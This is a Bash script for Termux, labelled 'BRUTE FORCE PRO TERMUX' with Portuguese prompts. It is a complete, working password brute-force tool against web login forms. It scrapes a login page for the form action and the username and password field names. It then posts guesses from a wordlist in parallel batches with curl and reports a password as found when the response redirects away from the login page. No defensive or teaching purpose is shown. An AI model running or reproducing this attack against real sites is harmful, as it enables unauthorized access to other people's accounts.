#!/bin/bash

clear
echo -e "\e[1;32m==== BRUTE FORCE PRO TERMUX [DETECÇÃO AUTOMÁTICA + REDIRECIONAMENTO] ====\e[0m"

read -p "🔗 URL da página de login (não o action): " page_url
[ -z "$page_url" ] && echo -e "\e[1;31m❌ URL obrigatória.\e[0m" && exit 1

echo -e "\e[1;34m▶️ Analisando a página...\e[0m"
html=$(curl -s "$page_url")

# Detectar action do formulário
action=$(echo "$html" | grep -oP '(?<=<form[^>]*action=["'"'"']).*?(?=["'"'"'])' | head -n1)
if [[ "$action" != http* ]]; then
  # Caso action seja relativo
  action="${page_url%/}/$action"
fi
echo -e "📤 Form Action detectado: \e[1;33m$action\e[0m"

# Detectar campos de usuário e senha
userfield=$(echo "$html" | grep -oiP 'name=["'"'"']\K[^"'"'"']+(?=["'"'"'][^>]*type=["'"'"']?(text|email)["'"'"']?)' | head -n1)
passfield=$(echo "$html" | grep -oiP 'name=["'"'"']\K[^"'"'"']+(?=["'"'"'][^>]*type=["'"'"']?password["'"'"']?)' | head -n1)

echo -e "🖋️ Campo de usuário detectado: \e[1;33m$userfield\e[0m"
echo -e "🖋️ Campo de senha detectado: \e[1;33m$passfield\e[0m"

read -p "👤 Usuário: " user
[ -z "$user" ] && echo -e "\e[1;31m❌ Usuário obrigatório.\e[0m" && exit 1

read -p "🔑 Senha personalizada (pressione ENTER para usar lista): " senha

# Função para testar senha — detectando redirecionamento
testar_senha() {
  local pwd=$1

  # Captura o código HTTP e URL final após seguir redirects
  result=$(curl -s -L -w "%{url_effective} %{http_code}" -o /dev/null -X POST "$action" -d "$userfield=$user&$passfield=$pwd")
  final_url=$(echo "$result" | awk '{print $1}')
  status_code=$(echo "$result" | awk '{print $2}')

  if [[ "$final_url" != "$page_url" && "$status_code" =~ ^2|3 ]]; then
    echo -e "\e[1;32m✅ SENHA ENCONTRADA: $pwd → REDIRECIONADO PARA: $final_url\e[0m"
    kill 0 2>/dev/null
    exit 0
  else
    echo -e "\e[0;31m❌ $pwd\e[0m"
  fi
}

if [ -z "$senha" ]; then
  read -p "📂 Nome do arquivo de senhas (.txt): " wordlist
  [ ! -f "$wordlist" ] && echo -e "\e[1;31m❌ Arquivo não encontrado.\e[0m" && exit 1
  echo -e "\e[1;34m▶️ Iniciando brute-force...\e[0m"

  max_procs=10
  count=0

  while IFS= read -r pwd; do
    testar_senha "$pwd" &
    ((count++))
    if (( count % max_procs == 0 )); then
      wait
    fi
  done < "$wordlist"

  wait
  echo -e "\e[1;33m🔔 Fim da lista.\e[0m"

else
  echo -e "\e[1;34m▶️ Testando senha personalizada: $senha\e[0m"
  testar_senha "$senha"
fi
